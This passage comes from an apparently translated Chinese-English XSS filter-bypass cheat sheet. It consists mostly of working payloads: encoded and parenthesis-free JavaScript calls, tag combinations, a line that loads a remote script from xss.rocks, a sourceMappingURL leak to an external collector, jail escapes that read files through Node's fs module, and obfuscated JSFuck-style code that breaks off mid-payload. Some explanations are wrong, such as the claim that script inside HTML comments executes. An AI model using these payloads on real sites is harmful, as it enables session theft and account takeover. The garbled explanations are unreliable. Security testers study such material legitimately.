2. Craft a payload that contains the JavaScript code you want to execute. Ensure that the code is encoded using Unicode.
3. Submit the payload through the vulnerable input field.
4. If successful, the JavaScript code will be executed in the context of the vulnerable web application.

#### Example

Suppose we have a vulnerable input field that reflects user input without proper sanitization:

```html
<input type="text" name="message" value="Hello, [user_input]">
```

To execute a simple alert box using Unicode encoding, we can use the following payload:

```html
<script>
    var payload = "\u003cscript\u003ealert('XSS')\u003c/script\u003e";
    document.getElementsByName("message")[0].value = payload;
</script>
```

When the payload is submitted, the JavaScript code will be executed, resulting in an alert box displaying the text "XSS".

#### Prevention

To prevent this type of vulnerability, it is essential to implement proper input validation and sanitization techniques. Here are some recommendations:

- Use a secure development framework that automatically sanitizes user input.
- Implement a content security policy (CSP) to restrict the execution of inline scripts.
- Apply input validation and filtering to ensure that user input does not contain malicious code.
- Encode user input before displaying it to prevent script execution.

By following these best practices, you can significantly reduce the risk of XSS attacks through Unicode encoding.
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
### JavaScript绕过黑名单技术

**字符串**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**特殊转义字符**

In some cases, the usual HTML encoding may not be enough to bypass filters or to execute JavaScript code. In these situations, special escape characters can be used to achieve the desired effect. Here are some commonly used special escape characters:

在某些情况下，通常的HTML编码可能不足以绕过过滤器或执行JavaScript代码。在这些情况下，可以使用特殊的转义字符来实现所需的效果。以下是一些常用的特殊转义字符：

- **`&#xHH;`**: This escape sequence represents a Unicode character with the hexadecimal value `HH`. For example, `&#x3C;` represents the `<` character.

- **`&#xHH;`**：这个转义序列表示一个十六进制值为`HH`的Unicode字符。例如，`&#x3C;`表示`<`字符。

- **`&#xDD;`**: This escape sequence represents a Unicode character with the decimal value `DD`. For example, `&#60;` represents the `<` character.

- **`&#xDD;`**：这个转义序列表示一个十进制值为`DD`的Unicode字符。例如，`&#60;`表示`<`字符。

- **`\uHHHH`**: This escape sequence represents a Unicode character with the hexadecimal value `HHHH`. For example, `\u003C` represents the `<` character.

- **`\uHHHH`**：这个转义序列表示一个十六进制值为`HHHH`的Unicode字符。例如，`\u003C`表示`<`字符。

- **`\xDD`**: This escape sequence represents a character with the hexadecimal value `DD`. For example, `\x3C` represents the `<` character.

- **`\xDD`**：这个转义序列表示一个十六进制值为`DD`的字符。例如，`\x3C`表示`<`字符。

These special escape characters can be used in combination with HTML encoding to bypass filters or to execute JavaScript code in certain contexts. It is important to understand the specific context and filter being used in order to determine which escape characters are appropriate for the situation.

这些特殊转义字符可以与HTML编码结合使用，以绕过过滤器或在特定上下文中执行JavaScript代码。重要的是要理解特定的上下文和过滤器，以确定哪些转义字符适用于该情况。
```javascript
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
```
**JS代码中的空格替换**

在进行跨站脚本攻击时，有时需要绕过输入过滤和防御机制。一种常见的技术是使用空格替换来绕过这些限制。以下是一些常见的空格替换技术：

- **空格字符**：使用空格字符（` `）来替换空格。例如，将`<script>`替换为`<s c r i p t>`。

- **制表符**：使用制表符（`\t`）来替换空格。例如，将`<script>`替换为`<s\tc\tr\ti\tp\t>`。

- **换行符**：使用换行符（`\n`）来替换空格。例如，将`<script>`替换为`<s\n\rc\nr\ri\np\n\t>`。

- **回车符**：使用回车符（`\r`）来替换空格。例如，将`<script>`替换为`<s\rc\rr\ri\rp\rt>`。

- **垂直制表符**：使用垂直制表符（`\v`）来替换空格。例如，将`<script>`替换为`<s\vc\vr\vi\vp\vt>`。

使用这些空格替换技术可以绕过一些简单的过滤和防御机制，从而成功执行跨站脚本攻击。
```javascript
<TAB>
/**/
```
**JavaScript注释（来自[JavaScript注释技巧](./#javascript-comments)）**

JavaScript注释是在代码中添加注释以提供解释和说明的一种方法。注释不会被浏览器执行，因此对代码的功能没有影响。在XSS攻击中，注释可以用来绕过过滤器和检测机制。

以下是一些常见的JavaScript注释类型：

- 单行注释：使用`//`符号在一行中注释代码。
- 多行注释：使用`/* */`符号在多行中注释代码。

在XSS攻击中，注释可以用来隐藏恶意代码，使其不被过滤器检测到。例如，攻击者可以使用注释来绕过输入过滤器，将恶意代码注入到受害者的网页中。

以下是一个使用注释绕过XSS过滤器的示例：

```html
<script>
    var payload = "<img src=x onerror=alert('XSS')>"; // 恶意代码被注释掉
    document.getElementById("target").innerHTML = payload; // 恶意代码不会被过滤器检测到
</script>
```

在上面的示例中，恶意代码被注释掉，使其不会被过滤器检测到。然而，当注释被解析时，恶意代码将被执行，导致XSS攻击成功。

为了防止XSS攻击，开发人员应该对用户输入进行严格的过滤和验证，并避免直接将用户输入插入到HTML代码中。
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript换行（来自[JavaScript换行技巧](./#javascript-new-lines)）**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```
**JavaScript空格**

在编写JavaScript代码时，空格是可以被忽略的字符。这意味着在代码中添加或删除空格不会影响代码的功能。然而，空格在某些情况下可以被利用来绕过安全措施或执行恶意操作。

**空格绕过技巧**

1. **空格编码**：通过将空格字符编码为其他字符，可以绕过输入过滤和安全检查。例如，将空格编码为十六进制值`%20`或十进制值`&#32;`。

2. **空格拆分**：在某些情况下，可以通过在关键词或函数名称中插入空格来绕过代码过滤。例如，将`alert`拆分为`al ert`。

3. **空格混淆**：通过在关键位置插入多个空格字符，可以混淆代码并使其难以阅读。这可以用于隐藏恶意代码或绕过代码审查。

4. **空格注释**：在注释中插入空格字符可以绕过代码过滤和检测。例如，将`<!--`注释标记与空格组合使用。

**空格利用示例**

以下是一些利用空格的XSS攻击示例：

```html
<script>
  var xss = 'alert(1)'; // 恶意代码
  eval('ev' + 'al')(xss); // 利用空格拆分
</script>

<img src=x onerror='javas&#99;ript:alert(1)'> <!-- 利用空格编码 -->

<script>
  var xss = 'alert(1)'; // 恶意代码
  var payload = 'javas' + String.fromCharCode(9) + 'cript:' + xss; // 利用空格混淆
  document.write('<img src="' + payload + '">');
</script>

<script>
  var xss = 'alert(1)'; // 恶意代码
  var payload = 'javas' + String.fromCharCode(160) + 'cript:' + xss; // 利用不可见空格混淆
  document.write('<img src="' + payload + '">');
</script>
```

以上是一些常见的利用JavaScript空格的技巧和示例。了解这些技术可以帮助您更好地理解和防范XSS攻击。
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**注释中的Javascript**

在某些情况下，攻击者可以将恶意的Javascript代码插入到HTML注释中，以绕过过滤器和防御机制。当用户浏览包含注释的页面时，浏览器会忽略注释，但是Javascript代码仍然会被执行。

攻击者可以利用这种技术来执行跨站脚本攻击（XSS），从而窃取用户的敏感信息或在受害者的浏览器上执行恶意操作。

以下是一个示例，展示了如何在注释中插入恶意的Javascript代码：

```html
<!-- <script>alert('XSS');</script> -->
```

在这个例子中，恶意的Javascript代码被注释掉了，所以在页面上看不到任何效果。然而，当用户访问这个页面时，浏览器会执行注释中的Javascript代码，弹出一个包含"XSS"的警告框。

为了防止这种攻击，开发人员应该对用户输入进行严格的过滤和验证，并确保在输出到页面之前对所有内容进行适当的编码。
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**没有括号的JavaScript**

在某些情况下，可以在JavaScript中省略括号。这种技术可以用于XSS攻击中，以绕过一些过滤器和防御机制。

当在HTML标签的属性中注入JavaScript代码时，可以使用这种技术。通过省略括号，可以绕过一些过滤器，因为它们通常会检测和过滤带有括号的JavaScript代码。

以下是一个示例，展示了如何在没有括号的情况下执行JavaScript代码：

```html
<img src="x" onerror="alert`XSS`">
```

在这个例子中，我们使用了模板字符串（template string）来执行JavaScript代码。通过使用反引号而不是括号，我们可以绕过一些过滤器，因为它们通常只检测和过滤带有括号的代码。

这种技术的关键是找到适合的上下文，以便可以省略括号并成功执行JavaScript代码。
````javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
````
* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**任意函数（alert）调用**
````javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
````
## **DOM漏洞**

有一段**JS代码**正在使用由攻击者控制的**不安全数据**，比如`location.href`。攻击者可以利用这个漏洞来执行任意的JS代码。\
**由于对DOM漏洞的解释较长，已将其移至此页面**：[**dom-xss.md**](dom-xss.md)**:**

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

在那里，您将找到关于**DOM漏洞是什么，如何引发它们以及如何利用它们的详细解释**。\
此外，请不要忘记**在上述帖子的末尾**可以找到关于[**DOM Clobbering攻击**](dom-xss.md#dom-clobbering)的解释。

## 其他绕过方法

### 规范化Unicode

您可以检查服务器（或客户端）中的**反射值是否已进行Unicode规范化**，并利用此功能绕过保护措施。[**在此处找到一个示例**](../unicode-injection/#xss-cross-site-scripting)。

### PHP FILTER\_VALIDATE\_EMAIL标志绕过
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails绕过

由于**RoR大规模分配**，引号被插入到HTML中，然后引号限制被绕过，可以在标签内添加额外字段（onfocus）。\
例如表单（[来自此报告](https://hackerone.com/reports/709336)），如果发送以下有效载荷：
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
键值对 "Key" 和 "Value" 将会被回显如下：
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
然后，将插入onfocus属性：

![](<../../.gitbook/assets/image (107).png>)

发生了XSS攻击。

### 特殊组合
```markup
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
```
### 在302响应中进行头部注入的XSS攻击

如果你发现可以在302重定向响应中**注入头部**，你可以尝试让浏览器**执行任意的JavaScript代码**。这并不容易，因为现代浏览器在HTTP响应状态码为302时不会解析HTTP响应体，所以仅仅一个跨站脚本负载是无用的。

在[**这个报告**](https://www.gremwell.com/firefox-xss-302)和[**这个报告**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/)中，你可以了解如何测试Location头部中的多个协议，并查看是否有任何协议允许浏览器检查和执行主体中的XSS负载。\
已知的协议有：`mailto://`，`//x:1/`，`ws://`，`wss://`，空的Location头部，`resource://`。

### 仅限字母、数字和点号

如果你能够指定**回调函数**将要**执行**的JavaScript代码，限制为这些字符。[**阅读这篇文章的这一部分**](./#javascript-function)以了解如何利用这种行为。

### 可用于XSS的有效`<script>`内容类型

（来自[**这里**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)）如果你尝试加载一个带有`application/octet-stream`等**内容类型**的脚本，Chrome将抛出以下错误：

> 拒绝执行来自 '[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') 的脚本，因为其MIME类型（'application/octet-stream'）不可执行，并且启用了严格的MIME类型检查。

唯一支持Chrome运行**加载的脚本**的**内容类型**是位于[https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc)中的常量**`kSupportedJavascriptTypes`**中的内容。
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### XSS中的脚本类型

（来自[**这里**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)）那么，有哪些类型可以用来加载脚本呢？
```html
<script type="???"></script>
```
答案是：

* **module**（默认值，无需解释）
* \*\*\*\*[**webbundle**](https://web.dev/web-bundles/)：Web Bundles 是一种功能，可以将一系列数据（HTML、CSS、JS 等）打包到一个 **`.wbn`** 文件中。
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
* \*\*\*\*[**importmap**](https://github.com/WICG/import-maps)**：** 允许改进导入语法
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>
```
这种行为在[**这篇文章**](https://github.com/zwade/yaca/tree/master/solution)中被用来重新映射一个库到eval以滥用它来触发XSS。

* \*\*\*\*[**speculationrules**](https://github.com/WICG/nav-speculation)**：** 这个功能主要是为了解决预渲染引起的一些问题。它的工作原理如下：
```html
<script type="speculationrules">
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
</script>
```
### Web Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 下列内容类型可以在所有浏览器中执行 XSS 攻击：

* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? 不在列表中，但我记得在 CTF 中见过)
* application/rss+xml (关闭)
* application/atom+xml (关闭)

在其他浏览器中，可以使用其他 **`Content-Types`** 来执行任意的 JS，请参考：[https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

如果页面返回的是 text/xml content-type，可以指定一个命名空间并执行任意的 JS：
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 特殊替换模式

当使用类似于 **`"some {{template}} data".replace("{{template}}", <user_input>)`** 的代码时，攻击者可以使用[**特殊字符串替换**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/String/replace#specifying\_a\_string\_as\_the\_replacement)来尝试绕过某些保护措施：``"123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))``

例如，在[**这个解析**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA)中，这被用来在脚本中**转义一个JSON字符串**并执行任意代码。

### Chrome缓存到XSS

### XS Jails

如果你只有一组有限的字符可用，可以检查这些其他有效的XSJail问题的解决方案：
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
### 混淆和高级绕过

* **同一页面中的不同混淆方法：** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
* [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
* [https://ooze.ninja/javascript/poisonjs](https://ooze.ninja/javascript/poisonjs)
* [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
* [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
* [http://www.jsfuck.com/](http://www.jsfuck.com)
* 更复杂的JSFuck：[https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
* [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
* [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
* [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]